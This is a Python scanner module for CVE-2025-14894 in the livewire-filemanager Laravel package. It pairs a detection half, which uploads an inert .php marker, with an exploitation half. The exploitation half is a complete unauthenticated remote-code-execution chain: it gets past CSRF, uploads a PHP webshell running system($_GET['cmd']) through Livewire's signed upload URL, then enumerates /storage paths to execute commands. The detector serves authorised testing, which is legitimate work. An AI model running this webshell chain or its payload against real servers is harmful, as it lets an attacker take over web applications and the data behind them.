#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2025-14894')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2025-14894 detector for livewire-filemanager/filemanager <= 1.0.4.

The exploit path uploads a PHP file through a public Livewire file-manager component
and then executes it from /storage. This scanner uses an inert .php marker (no PHP
tags) and stops at the safe proof point: the marker file persisted under public
storage. It never uploads executable PHP and never calls a command.
"""

import html
import json
import re
from typing import Dict, Optional
from urllib.parse import urljoin, unquote, urlparse

import requests

from modules.core import http_config
from modules.generators.livewire_filemanager_endpoints import (
    FILEMANAGER_AUX_PATHS,
    FILEMANAGER_UPLOAD_PATHS,
    FILEMANAGER_COMPONENT_PATHS,
    CVE_2025_14894_EXTRA_PATH_HINTS,
)

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Discovery candidates, tried in order. The empty string means "the canonical base
# itself" — check.py commits to the post-redirect base, and this lab's `/` 301s to
# `/filemanager`, so check.py hands modules a base that ALREADY ends in /filemanager.
# Appending "/filemanager" again would hit the package's `{path}` catch-all asset route
# (a 404), never the component view. Probing the base directly (path "") reaches the
# component whether the base is the raw root (the GET follows the redirect) or the
# already-canonicalized /filemanager page. The explicit paths remain as fallbacks for
# targets handed a bare root that does NOT auto-redirect.
FILEMANAGER_PATHS = ("",) + FILEMANAGER_UPLOAD_PATHS + FILEMANAGER_AUX_PATHS + FILEMANAGER_COMPONENT_PATHS + (
    "/admin",
    "/admin/queue",
    "/admin/queue/monitor",
    "/storage/upload",
    *CVE_2025_14894_EXTRA_PATH_HINTS,
)
FILEMANAGER_HINT_TOKENS = (
    "filemanager", "file-manager", "media", "livewire", "manager", "upload",
    "ckfinder", "ckfinder.html", "tran_es", "admin", "laravel-filemanager",
    "livewire-filemanager", "api", "laravel-file-manager", "lfm", "backend",
    "assets", "public", "elfinder", "file-library", "media-library", "queue",
    "storage",
)


def _extract_route_map(kwargs) -> Dict[str, Dict]:
    if not isinstance(kwargs, dict):
        return {}
    route_map = kwargs.get("route_map")
    if isinstance(route_map, dict):
        return route_map
    discovery = kwargs.get("discovery")
    if isinstance(discovery, dict):
        route_map = discovery.get("route_map")
        if isinstance(route_map, dict):
            return route_map
    return {}


def _is_upload_surface(path: str) -> bool:
    if not isinstance(path, str):
        return False
    low = path.lower()
    if not low.startswith("/"):
        return False
    return any(tok in low for tok in FILEMANAGER_HINT_TOKENS)


def _candidate_filemanager_paths(route_map: Dict[str, Dict], extra_paths=None) -> list[str]:
    paths = list(FILEMANAGER_PATHS)
    if extra_paths:
        for p in extra_paths:
            if p:
                paths.append(p)
    for path in route_map:
        if _is_upload_surface(path):
            paths.append(path)
    # Deduplicate while preserving order
    dedup = []
    seen = set()
    for path in paths:
        if path not in seen:
            seen.add(path)
            dedup.append(path)
    return dedup


def scan(target_url: str, *, session=None, username=None, password=None, timeout: int = 10, **kwargs) -> Optional[Dict]:
    """
    Detect CVE-2025-14894 without uploading a file.

    Returns:
        None when no public Livewire file-manager component is found.
        A result dict when the component is found and probed.
    """
    if not target_url:
        return None

    sess = session or http_config.get_auth_session()
    base_url = _normalize_base(target_url)
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2025-14894"})
    route_map = _extract_route_map(kwargs)

    for path in _candidate_filemanager_paths(route_map):
        component = _fetch_component(sess, base_url, path, timeout)
        if not component:
            continue

        result = _probe_php_upload_start(sess, base_url, component, timeout)
        if result:
            if result.get("status") in ("vulnerable", "not_confirmed", "protected", "error"):
                result["artifacts"] = {
                    "filemanager_path": component["filemanager_path"],
                    "filemanager_url": component["filemanager_url"],
                    "app_base_url": component["app_base_url"],
                    "livewire_update_url": component["update_url"],
                    "filemanager_component": component,
                    "route_hints_used": len(_candidate_filemanager_paths(route_map)),
                }
            return result

    return None


def _normalize_base(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _app_base_from_component_response(base_url: str, final_url: str, path: str) -> str:
    """Infer the Laravel app base from the reached filemanager component route.

    The Livewire update and public storage endpoints live at the app base. If the
    operator points directly at `/filemanager`, using that URL as the base would
    build `/filemanager/livewire/update` and `/filemanager/storage/...`.
    """
    candidate = final_url or base_url
    parsed = urlparse(candidate)
    if not parsed.scheme or not parsed.netloc:
        return base_url.rstrip("/")

    root = f"{parsed.scheme}://{parsed.netloc}"
    route_path = (parsed.path or "").rstrip("/")
    for suffix in ("/admin/file-manager", "/admin/filemanager", "/filemanager"):
        if route_path.lower().endswith(suffix):
            parent = route_path[: -len(suffix)].rstrip("/")
            return (root + parent) if parent else root

    return base_url.rstrip("/")


def _fetch_component(session: requests.Session, base_url: str, path: str, timeout: int) -> Optional[Dict]:
    # Empty path => probe the canonical base verbatim (no trailing slash, which on
    # this package routes to `{path}` catch-all asset route when path is not empty).
    probe_path = path or ""
    if probe_path and probe_path.startswith(("http://", "https://")):
        filemanager_url = probe_path
        parsed = urlparse(probe_path)
        probe_path = parsed.path or "/"
    else:
        filemanager_url = urljoin(base_url + "/", probe_path.lstrip("/")) if probe_path else base_url

    try:
        response = session.get(filemanager_url, timeout=timeout, verify=False, allow_redirects=True)
    except requests.RequestException:
        return None

    if response.status_code != 200:
        return None

    body = response.text or ""
    snapshot = _extract_wire_snapshot(body)
    wire_id = _extract_first_match(r'wire:id="([^"]+)"', body)
    livewire_prefix = _extract_first_match(r"(livewire(?:-[a-f0-9]+)?)/update", body) or "livewire"

    # CSRF resolution. Older/SPA Livewire pages render a <meta name="csrf-token"> (the PLAINTEXT
    # token) which Laravel verifies via the X-CSRF-TOKEN header / `_token` body field. Many modern
    # Livewire 3 apps render NO such tag and instead rely on the encrypted XSRF-TOKEN cookie —
    # Laravel's VerifyCsrfToken accepts that cookie's value (URL-decoded) in the X-XSRF-TOKEN header
    # (it decrypts it server-side). We try the body token first, then fall back to the cookie, and
    # carry BOTH the header name and value so the caller sends the correct header (a token meant for
    # X-XSRF-TOKEN sent as X-CSRF-TOKEN — or vice versa — yields a 419). See _csrf_from_component().
    csrf = _extract_csrf_token(body)
    if csrf:
        csrf_header, csrf_value, csrf_token_field = "X-CSRF-TOKEN", csrf, csrf
    else:
        xsrf_cookie = session.cookies.get("XSRF-TOKEN")
        if not xsrf_cookie:
            return None
        # The cookie is URL-encoded in the jar; Laravel expects the decoded ciphertext in the header.
        csrf_value = unquote(xsrf_cookie)
        csrf, csrf_header, csrf_token_field = csrf_value, "X-XSRF-TOKEN", None

    if not snapshot or not wire_id or not csrf:
        return None

    if not _looks_like_filemanager_component(snapshot, probe_path):
        return None

    app_base_url = _app_base_from_component_response(base_url, response.url, path)
    update_url = urljoin(app_base_url + "/", livewire_prefix.strip("/") + "/update")

    return {
        "filemanager_path": path,
        "filemanager_url": response.url or filemanager_url,
        "app_base_url": app_base_url,
        "update_url": update_url,
        "snapshot": snapshot,
        "wire_id": wire_id,
        "csrf": csrf,
        # How to present CSRF on the /livewire/update POST (set by the resolution above).
        "csrf_header": csrf_header,        # "X-CSRF-TOKEN" (plaintext) or "X-XSRF-TOKEN" (cookie)
        "csrf_token_field": csrf_token_field,  # value for the body "_token" field, or None to omit
        "livewire_prefix": livewire_prefix,
    }


def _probe_php_upload_start(
    session: requests.Session,
    base_url: str,
    component: Dict,
    timeout: int,
) -> Dict:
    app_base_url = component.get("app_base_url") or base_url
    update_url = urljoin(app_base_url + "/", component["livewire_prefix"].strip("/") + "/update")
    result = {
        "cve": "CVE-2025-14894",
        "vulnerable": False,
        "status": "not_confirmed",
        "verdict": "surface_present",
        "proof_type": "fingerprint",
        "severity": "critical",
        "filemanager_path": component["filemanager_path"],
        "filemanager_url": component["filemanager_url"],
        "app_base_url": app_base_url,
        "livewire_update_url": update_url,
        "http_status": None,
        "signed_upload_url": None,
        "evidence": ["public Livewire filemanager component reachable"],
        "notes": "Safe probe uploads an inert .php marker and checks whether it is persisted under public storage.",
    }

    try:
        csrf = component["csrf"]
        csrf_header = component.get("csrf_header", "X-CSRF-TOKEN")
        csrf_token_field = component.get("csrf_token_field", csrf)

        active_snapshot = component["snapshot"]
        if _snapshot_current_folder(active_snapshot) is None:
            try:
                folder_name = "lvscan" + uuid.uuid4().hex[:6]
                new_snapshot, _ = _livewire_update(
                    session,
                    update_url,
                    csrf,
                    active_snapshot,
                    calls=[{"path": "", "method": "saveNewFolder", "params": []}],
                    updates={"newFolderName": folder_name, "isCreatingNewFolder": True},
                    csrf_header=csrf_header,
                    csrf_token_field=csrf_token_field,
                )
                if new_snapshot and _snapshot_current_folder(new_snapshot) is not None:
                    active_snapshot = new_snapshot
            except requests.RequestException:
                pass

        marker = "LVSCAN14894_" + uuid.uuid4().hex
        probe_name = "lvscan" + uuid.uuid4().hex[:8] + ".php"
        snapshot, effects = _livewire_update(
            session,
            update_url,
            csrf,
            active_snapshot,
            calls=[
                {
                    "path": "",
                    "method": "_startUpload",
                    "params": [
                        "files",
                        [{"name": probe_name, "size": len(marker), "type": "application/x-php"}],
                        True,
                    ],
                }
            ],
            csrf_header=csrf_header,
            csrf_token_field=csrf_token_field,
        )
        response = type("_ProbeResponse", (), {"status_code": 200})()
    except requests.RequestException as exc:
        result["status"] = "error"
        result["error"] = str(exc)
        return result
    except Exception as exc:
        result["status"] = "error"
        result["error"] = str(exc)
        return result

    result["http_status"] = response.status_code

    signed_url = _signed_url_from_effects(effects, app_base_url)
    if not signed_url:
        result["evidence"].append("Livewire response did not include upload:generatedSignedUrl")
        return result

    result["signed_upload_url"] = signed_url
    try:
        up = session.post(
            signed_url,
            files={"files[]": (probe_name, marker, "application/x-php")},
            headers={component.get("csrf_header", "X-CSRF-TOKEN"): component["csrf"]},
            timeout=timeout,
            verify=False,
        )
        if up.status_code not in (200, 201):
            result["status"] = "protected"
            result["evidence"].append(f"signed upload rejected with HTTP {up.status_code}")
            return result
        try:
            tmp_paths = up.json().get("paths", [])
        except (ValueError, TypeError):
            tmp_paths = []
        if not tmp_paths:
            result["evidence"].append("signed upload did not return a temporary file path")
            return result

        _livewire_update(
            session,
            update_url,
            component["csrf"],
            snapshot,
            calls=[
                {
                    "path": "",
                    "method": "_finishUpload",
                    "params": ["files", [tmp_paths[0]], True],
                }
            ],
            csrf_header=csrf_header,
            csrf_token_field=csrf_token_field,
        )
        time.sleep(0.5)

        for media_id in range(1, 60):
            marker_url = f"{app_base_url}/storage/{media_id}/{probe_name}"
            try:
                probe = session.get(marker_url, timeout=timeout, verify=False)
            except requests.RequestException:
                continue
            if probe.status_code == 200 and marker in (probe.text or ""):
                result["vulnerable"] = True
                result["status"] = "confirmed_vulnerable"
                result["verdict"] = "confirmed_vulnerable"
                result["proof_type"] = "safe_active"
                result["marker_url"] = marker_url
                result["evidence"].append("inert .php marker persisted under public storage")
                return result

        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["evidence"].append("php-named marker did not persist under public storage")
    except requests.RequestException as exc:
        result["status"] = "error"
        result["error"] = str(exc)
    except Exception as exc:
        result["status"] = "error"
        result["error"] = str(exc)

    return result


def _extract_wire_snapshot(body: str) -> Optional[str]:
    raw = _extract_first_match(r'wire:snapshot="([^"]+)"', body)
    return html.unescape(raw) if raw else None


def _extract_csrf_token(body: str) -> Optional[str]:
    token = _extract_first_match(r'name="csrf-token"\s+content="([^"]+)"', body)
    if token:
        return html.unescape(token)
    return _extract_first_match(r'"csrfToken"\s*:\s*"([^"]+)"', body)


def _extract_first_match(pattern: str, text: str) -> Optional[str]:
    match = re.search(pattern, text, re.IGNORECASE)
    return match.group(1) if match else None


def _looks_like_filemanager_component(snapshot: str, _path: str) -> bool:
    # Require a "filemanager"/"file-manager" token somewhere in the component so we don't
    # drive the upload handshake against an unrelated Livewire component. We don't pin the
    # exact memo shape: the published package's memo.name may be a class path or aliased
    # slug, so if memo.name/memo.path don't carry the token we fall back to scanning the
    # whole (decoded) snapshot — which still REQUIRES the token, so it can't match an
    # unrelated component. The gate never asserts vulnerability on its own; that is decided
    # only by a real signed upload URL (detector) / real command output (exploit).
    raw = snapshot.lower()
    try:
        decoded = json.loads(snapshot)
    except (TypeError, ValueError):
        return "filemanager" in raw or "file-manager" in raw

    memo = decoded.get("memo", {}) if isinstance(decoded, dict) else {}
    component_hints = " ".join([
        str(memo.get("name", "")),
        str(memo.get("path", "")),
    ]).lower()

    if "filemanager" in component_hints or "file-manager" in component_hints:
        return True
    return "filemanager" in raw or "file-manager" in raw


def _extract_signed_upload_url(response: requests.Response, base_url: str) -> Optional[str]:
    try:
        data = response.json()
    except (ValueError, TypeError):
        return None

    components = data.get("components", []) if isinstance(data, dict) else []
    for component in components:
        effects = component.get("effects", {}) if isinstance(component, dict) else {}
        for event in effects.get("dispatches", []) or []:
            if event.get("name") != "upload:generatedSignedUrl":
                continue
            url = (event.get("params") or {}).get("url")
            if not url:
                continue
            return urljoin(base_url + "/", url.lstrip("/")) if url.startswith("/") else url

    return None


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2025-14894 exploitation half — livewire-filemanager unrestricted .php upload RCE.

Split from the original modules/cve_2025_14894.py (detection half:
modules/cves/cve_2025_14894.py). Exploitation may import from modules root
(shared infra) and modules.detection; never the reverse.
"""

import time
import uuid
from typing import Optional
from urllib.parse import urljoin, urlparse

import requests

from modules.core import http_config
from modules.generators.livewire_filemanager_endpoints import (
    FILEMANAGER_COMPONENT_PATHS,
    FILEMANAGER_AUX_PATHS,
    ADMIN_REPORT_PATHS,
    CVE_2025_14894_EXTRA_PATH_HINTS,
)
from modules.helpers.livewire_upload import snapshot_model_key

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


# ---------------------------------------------------------------------------
# Exploit (per /tmp/EXPLOIT_CONTRACT.md): unauthenticated RCE via unrestricted
# .php file upload through the public Livewire file-manager component.
#
# Full chain (mirrors the lab's exploit.py):
#   1. GET /filemanager  -> wire:id, wire:snapshot, csrf, randomized livewire prefix
#   2. _startUpload      -> signed upload URL (upload:generatedSignedUrl dispatch)
#   3. POST webshell to the signed URL -> temp path
#   4. _finishUpload(updated snapshot) -> Spatie addMedia() with no MIME check ->
#      shell.php persisted on the public disk
#   5. GET /storage/<media_id>/<shell>.php?cmd=<command> -> command output
#
# success=True ONLY if the command output is observed AND the response is NOT the
# raw webshell source echoed back (which happens when mod_php is absent and the
# .php is served as text — that is NOT code execution).
# ---------------------------------------------------------------------------

_WEBSHELL = "<?php system($_GET['cmd']); ?>"


def _path_from_url(value):
    if not value:
        return None
    if not isinstance(value, str):
        return None
    if value.startswith(("http://", "https://")):
        try:
            return urlparse(value).path or "/"
        except Exception:
            return None
    return value


_EXTRA_ADMIN_FILEMANAGER_HINTS = tuple(dict.fromkeys((
    *FILEMANAGER_COMPONENT_PATHS,
    *FILEMANAGER_AUX_PATHS,
    *ADMIN_REPORT_PATHS,
    *CVE_2025_14894_EXTRA_PATH_HINTS,
    "/admin/ckfinder",
    "/admin/tran_es/report.html",
    "/admin/elfinder",
    "/admin/elfinder/connector",
    "/admin/elfinder/elfinder.html",
    "/admin/file-uploader",
    "/admin/fileupload",
    "/admin/file-upload",
    "/admin/_livewire/message",
    "/admin/_livewire/message/upload",
    "/admin/livewire/message",
    "/admin/livewire/message/upload",
    "/admin/storage-link",
    "/admin/storage/link",
    "/admin/file-library/upload",
    "/admin/media-library",
    "/admin/media-library/upload",
    "/admin/filemanager/upload",
    "/admin/file-manager/upload",
    "/admin/queue",
    "/admin/queue/monitor",
    "/admin/queue/list",
    "/admin/queue/failed",
    "/admin/queue/jobs",
    "/admin/report",
    "/admin/report.html",
    "/admin/reports",
    "/admin/reports.html",
    "/admin/file-manager-list",
)))


def _candidate_component_urls(base_url, route_map=None, detection=None, detection_artifacts=None):
    route_map = route_map or {}
    candidates = []
    extra = []

    # Direct handoff from detection when available (zero-fallback, no extra probing).
    artifacts = {}
    if isinstance(detection_artifacts, dict):
        artifacts.update(detection_artifacts)
    if isinstance(detection, dict):
        artifacts.update(detection.get("artifacts", {}) or {})

    det_component = artifacts.get("filemanager_component")
    if isinstance(det_component, dict):
        candidates.append(det_component.get("filemanager_url"))
        candidates.append(det_component.get("filemanager_path"))
        candidates.append(det_component.get("page_url"))
        # Keep any direct detection update URL for forensic chaining.
        if det_component.get("livewire_update_url"):
            candidates.append(det_component.get("livewire_update_url"))
        # The detection path is a highest-confidence route hint.
        if det_component.get("filemanager_path"):
            extra.append(det_component.get("filemanager_path"))

    # Alternate detection payload shapes from older modules / adapters.
    if isinstance(artifacts.get("upload_component_url"), str):
        candidates.append(artifacts["upload_component_url"])
    if isinstance(artifacts.get("livewire_upload_component"), dict):
        comp = artifacts["livewire_upload_component"]
        if isinstance(comp.get("page_url"), str):
            candidates.append(comp["page_url"])
        if isinstance(comp.get("update_url"), str):
            candidates.append(comp.get("update_url"))
    if artifacts.get("filemanager_url"):
        candidates.append(artifacts.get("filemanager_url"))
    if artifacts.get("upload_path"):
        extra.append(artifacts.get("upload_path"))
    if artifacts.get("upload_component_url"):
        candidates.append(artifacts.get("upload_component_url"))

    # Prefer known component routes and route-derived candidates from discovery.
    if isinstance(artifacts.get("filemanager_path"), str):
        extra.append(artifacts.get("filemanager_path"))
    if isinstance(artifacts.get("upload_component_path"), str):
        extra.append(artifacts.get("upload_component_path"))
    if isinstance(artifacts.get("upload_path"), str):
        extra.append(artifacts.get("upload_path"))
    for key in ("upload_component_path", "route_hint"):
        parsed = _path_from_url(artifacts.get(key))
        if parsed:
            extra.append(parsed)

    # A few extra practical paths used in admin/livewire CKFinder and report routes
    # that show up in real-world apps not always covered by generic filemanager scans.
    if route_map:
        for key in (
            "/admin/tran_es/report",
            "/admin/tran_es/report.html",
            "/admin/ckfinder/ckfinder.html",
            "/vendor/ckfinder/ckfinder.html",
            "/admin/storage-link",
            "/admin/storage/link",
        ):
            extra.append(key)
    # Add extra file-manager-style admin and storage-manager routes that are common
    # in real panels but not yet represented in route-derived probes.
    extra.extend(_EXTRA_ADMIN_FILEMANAGER_HINTS)

    for path in _candidate_filemanager_paths(route_map, extra_paths=extra):
        candidates.append(path)

    # Include the generic baseline list so non-detected apps can still be scanned.
    candidates.extend(FILEMANAGER_PATHS)

    # Normalise to stable, de-duplicated URLs, preserving order.
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    seen = set()
    ordered = []
    for cand in candidates:
        if not cand:
            page = base_url
        elif cand.startswith("http://") or cand.startswith("https://"):
            page = cand
        else:
            page = urljoin(root + "/", cand.lstrip("/"))
        if page in seen:
            continue
        seen.add(page)
        ordered.append(page)

    return ordered


def _detection_component_from_artifacts(detection=None, detection_artifacts=None):
    artifacts = {}
    if isinstance(detection_artifacts, dict):
        artifacts.update(detection_artifacts)
    if isinstance(detection, dict):
        artifacts.update(detection.get("artifacts", {}) or {})

    component = artifacts.get("filemanager_component")
    if not isinstance(component, dict):
        return None, False
    component = dict(component)
    if not component.get("update_url"):
        if artifacts.get("livewire_update_url"):
            component["update_url"] = artifacts["livewire_update_url"]
        elif component.get("app_base_url") and component.get("livewire_prefix"):
            component["update_url"] = urljoin(
                component["app_base_url"].rstrip("/") + "/",
                component["livewire_prefix"].strip("/") + "/update",
            )

    # _fetch_component returns a LivewireComponent-like dict with all required fields.
    if component.get("snapshot") and component.get("csrf") and component.get("update_url"):
        return component, True
    return None, False


def exploit(
    target_url: str,
    *,
    username: str = None,
    password: str = None,
    command: str = None,
    options: dict = None,
    session=None,
    **kwargs,
) -> dict:
    """Attempt real RCE against a live CVE-2025-14894 target. Never raises."""
    cmd = command or "echo CVE-2025-14894 PoC && id && hostname"
    result = {
        "cve": "CVE-2025-14894",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    if not target_url:
        result["attempted"] = False
        result["reason"] = "no target_url provided"
        result["detail"] = "missing target_url"
        return result

    # The orchestrator can pass detection artifacts directly into exploit() so we
    # reuse validated component evidence and avoid duplicate probing.
    detection = kwargs.get("detection")
    detection_artifacts = kwargs.get("detection_artifacts")

    base_url = _normalize_base(target_url)
    sess = session or http_config.get_auth_session()
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2025-14894"})

    route_map = _extract_route_map(kwargs)

    try:
        # Step 1: find the public Livewire file-manager component.
        component = None
        component, _ = _detection_component_from_artifacts(
            detection=detection,
            detection_artifacts=detection_artifacts,
        )
        if component:
            result["artifacts"]["selected_component_from_detection"] = True
            # Detection artifacts carry a CSRF token and Livewire snapshot from the
            # detector's HTTP session. check.py may call exploit() with a fresh
            # requests.Session, so replaying that token with this session's empty
            # cookie jar yields Laravel 419. Use the detection route as a high
            # confidence hint, but refresh the component inside the exploit
            # session so CSRF token, laravel_session, and snapshot agree.
            refreshed = _fetch_component(
                sess,
                base_url,
                component.get("filemanager_url") or component.get("filemanager_path") or "",
                timeout=15,
            )
            if refreshed:
                component = refreshed
                result["artifacts"]["refreshed_component_session"] = True

        candidate_urls = _candidate_component_urls(
            base_url,
            route_map=route_map,
            detection=detection,
            detection_artifacts=detection_artifacts,
        )

        for path in candidate_urls:
            if component:
                break
            component = _fetch_component(sess, base_url, path, timeout=15)
            if component:
                break
        if not component:
            result["reason"] = "no public Livewire file-manager component found"
            result["detail"] = "target does not expose a reachable /filemanager component"
            return result

        app_base_url = component.get("app_base_url") or base_url
        update_url = urljoin(
            app_base_url + "/", component["livewire_prefix"].strip("/") + "/update"
        )
        csrf = component["csrf"]
        # CSRF presentation resolved by _fetch_component: either ("X-CSRF-TOKEN", plaintext) from a
        # <meta csrf-token>, or ("X-XSRF-TOKEN", url-decoded cookie) when the page renders no meta tag
        # (common on Livewire 3). Sending the wrong header name -> 419, so we carry it through.
        csrf_header = component.get("csrf_header", "X-CSRF-TOKEN")
        csrf_token_field = component.get("csrf_token_field", csrf)

        # Predictable on-disk name: Str::slug() leaves hex digits unchanged, so
        # the stored file is exactly <base>.php at /storage/<media_id>/<base>.php.
        shell_base = "poc" + uuid.uuid4().hex[:8]
        shell_name = shell_base + ".php"

        # Step 1.5: ensure a CURRENT FOLDER exists (fresh-install handling). The
        # livewire-filemanager component persists uploads via `$this->currentFolder->addMedia(...)`
        # in _finishUpload; on a FRESH install the component mounts with currentFolder=null ("Your
        # root folder is not created"), so _finishUpload calls addMedia() on null and 500s. Creating
        # a folder via saveNewFolder() (which reads the $newFolderName property and ENTERS the new
        # folder) sets currentFolder, so the subsequent upload lands. We adopt the post-create
        # snapshot ONLY if currentFolder actually became non-null; otherwise we keep the original
        # (e.g. a lab/target that already has a selected root folder — the original behaviour).
        active_snapshot = component["snapshot"]
        if _snapshot_current_folder(active_snapshot) is None:
            try:
                folder_name = "poc" + uuid.uuid4().hex[:6]
                new_snapshot, _ = _livewire_update(
                    sess,
                    update_url,
                    csrf,
                    active_snapshot,
                    calls=[{"path": "", "method": "saveNewFolder", "params": []}],
                    updates={"newFolderName": folder_name, "isCreatingNewFolder": True},
                    csrf_header=csrf_header,
                    csrf_token_field=csrf_token_field,
                )
                if new_snapshot and _snapshot_current_folder(new_snapshot) is not None:
                    active_snapshot = new_snapshot
            except requests.RequestException:
                pass  # no folder step available — proceed with the original snapshot

        # Step 2: _startUpload -> signed upload URL. Capture the updated snapshot.
        snapshot, effects = _livewire_update(
            sess,
            update_url,
            csrf,
            active_snapshot,
            calls=[
                {
                    "path": "",
                    "method": "_startUpload",
                    "params": [
                        "files",
                        [{"name": shell_name, "size": len(_WEBSHELL), "type": "application/x-php"}],
                        True,
                    ],
                }
            ],
            csrf_header=csrf_header,
            csrf_token_field=csrf_token_field,
        )

        signed_url = _signed_url_from_effects(effects, app_base_url)
        if not signed_url:
            result["reason"] = "no signed upload URL returned by _startUpload"
            result["detail"] = "Livewire upload handshake blocked (possibly patched/protected)"
            return result

        # Step 3: upload the webshell to the signed URL -> temp path.
        up = sess.post(
            signed_url,
            files={"files[]": (shell_name, _WEBSHELL, "application/x-php")},
            headers={csrf_header: csrf},
            timeout=20,
            verify=False,
        )
        if up.status_code not in (200, 201):
            result["reason"] = f"signed upload rejected (HTTP {up.status_code})"
            result["detail"] = "webshell upload to signed URL failed"
            return result
        try:
            tmp_paths = up.json().get("paths", [])
        except (ValueError, TypeError):
            tmp_paths = []
        if not tmp_paths:
            result["reason"] = "no temp path returned from signed upload"
            result["detail"] = "upload endpoint did not park the webshell"
            return result
        tmp_file = tmp_paths[0]

        # Step 4: _finishUpload with the UPDATED snapshot -> Spatie addMedia (no MIME check).
        _livewire_update(
            sess,
            update_url,
            csrf,
            snapshot,
            calls=[
                {
                    "path": "",
                    "method": "_finishUpload",
                    "params": ["files", [tmp_file], True],
                }
            ],
            csrf_header=csrf_header,
            csrf_token_field=csrf_token_field,
        )
        time.sleep(1)

        # Step 5: locate + execute the persisted webshell. Fresh DB => low media ids.
        for media_id in range(1, 60):
            shell_url = f"{app_base_url}/storage/{media_id}/{shell_name}"
            try:
                probe = sess.get(shell_url, params={"cmd": cmd}, timeout=10, verify=False)
            except requests.RequestException:
                continue
            if probe.status_code != 200:
                continue
            body = (probe.text or "").strip()
            if not body:
                continue
            # Exclude echoed source: if mod_php isn't executing, the server returns
            # the raw "<?php system(...) ?>" as text. That is NOT code execution.
            if "<?php" in body or "$_GET['cmd']" in body:
                continue
            result["success"] = True
            result["evidence"] = body
            result["detail"] = f"unauthenticated RCE: `{cmd}` executed via uploaded {shell_name}"
            result["artifacts"] = {
                "webshell_url": f"{shell_url}?cmd=<command>",
                "payload": _WEBSHELL,
                "shell_name": shell_name,
                "media_id": media_id,
                "command": cmd,
            }
            return result

        result["reason"] = (
            "webshell uploaded but no executing /storage/<id>/<name>.php found "
            "(no mod_php / non-public disk / path differs)"
        )
        result["detail"] = "upload committed but RCE not observed"
        return result

    except requests.RequestException as exc:
        result["reason"] = f"request error: {exc}"
        result["detail"] = "network/HTTP error during exploitation"
        return result
    except Exception as exc:  # never raise to caller
        result["reason"] = f"unexpected error: {exc}"
        result["detail"] = "exploit aborted with an internal error"
        return result


def _livewire_update(session, update_url, csrf, snapshot, calls,
                     updates=None, csrf_header="X-CSRF-TOKEN", csrf_token_field=None):
    """POST a Livewire v3 message; return (updated_snapshot, effects).

    `updates` sets component public properties for this message (e.g. {"newFolderName": "x"}),
    mirroring wire:model binding — needed by actions like saveNewFolder that read a property.
    csrf_header / csrf_token_field carry the CSRF presentation resolved by _fetch_component:
    a plaintext <meta> token goes in BOTH the X-CSRF-TOKEN header and the body `_token`; an
    encrypted XSRF-TOKEN cookie goes ONLY in the X-XSRF-TOKEN header (never in `_token`).
    """
    payload = {"components": [{"snapshot": snapshot, "updates": updates or {}, "calls": calls}]}
    if csrf_token_field:
        payload["_token"] = csrf_token_field
    response = session.post(
        update_url,
        json=payload,
        headers={"X-Livewire": "true", csrf_header: csrf},
        timeout=20,
        verify=False,
    )
    if response.status_code != 200:
        raise requests.RequestException(
            f"{update_url} -> HTTP {response.status_code}: {response.text[:200]}"
        )
    data = response.json()
    comp = data["components"][0]
    return comp["snapshot"], comp.get("effects", {})


def _snapshot_current_folder(snapshot: str):
    """Return a truthy folder handle if the component has a `currentFolder` set, else None.

    Thin wrapper over the shared modules.helpers.livewire_upload.snapshot_model_key: Livewire serializes
    an Eloquent model property as a 2-tuple `[data, meta]`. For a SET model the meta carries the
    model's `key` (its DB id) — e.g. `[null, {"class": "...\\Folder", "key": 3, "s": "mdl"}]` —
    even though the data element is null. An UNSET model is a bare `null`. Decided by the meta
    `key`, not the (always-null-for-a-model) first element. Kept as a named function because the
    regression test and this module's fresh-install gate both reference it.
    """
    return snapshot_model_key(snapshot, "currentFolder")


def _signed_url_from_effects(effects: dict, base_url: str) -> Optional[str]:
    for event in (effects or {}).get("dispatches", []) or []:
        if event.get("name") != "upload:generatedSignedUrl":
            continue
        url = (event.get("params") or {}).get("url")
        if not url:
            continue
        if url.startswith("/"):
            return urljoin(base_url + "/", url.lstrip("/"))
        return _rebase_signed_host(url, base_url)
    return None


def _rebase_signed_host(signed_url: str, base_url: str) -> str:
    """Re-base an ABSOLUTE signed upload URL onto the real connection target.

    Livewire builds the signed upload URL from the *request Host*, so when the scan
    reaches the app via a forced `Host:` override (e.g. -H 'Host: _' to hit a non-
    default vhost), the server reflects that spoofed host into the absolute URL
    (`http://_/livewire-XXXX/upload-file?expires=...&signature=...`). POSTing there
    fails to resolve. Laravel's signed-URL signature is computed over the PATH +
    QUERY only (not the scheme/host), so swapping the host/scheme back to the target
    we actually connected to preserves a valid signature — verified: the rebased
    POST returns 200 and parks the file.

    No-op when the signed host already matches base_url (the common direct-target
    case), so non-Host-override scans — e.g. the :19090 lab — are unaffected.
    """
    try:
        su = urlparse(signed_url)
        bu = urlparse(base_url)
    except Exception:
        return signed_url
    if not su.scheme or not su.netloc:
        return signed_url  # not actually absolute; leave as-is
    if su.netloc == bu.netloc and (not su.scheme or su.scheme == bu.scheme):
        return signed_url  # already points at the connection target — nothing to fix
    rebased = su._replace(scheme=bu.scheme or su.scheme, netloc=bu.netloc)
    return rebased.geturl()
